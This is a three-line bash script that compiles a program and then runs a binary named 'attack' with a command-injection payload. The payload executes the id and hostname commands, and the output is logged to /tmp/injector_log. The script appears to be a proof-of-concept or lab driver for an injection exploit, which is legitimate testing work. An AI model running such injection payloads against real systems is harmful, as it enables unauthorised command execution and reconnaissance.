#!/bin/bash
bash -x  compile.sh
./attack 'echo "| -- $(id) -- | -- $(hostname) -- |"' > /tmp/injector_log
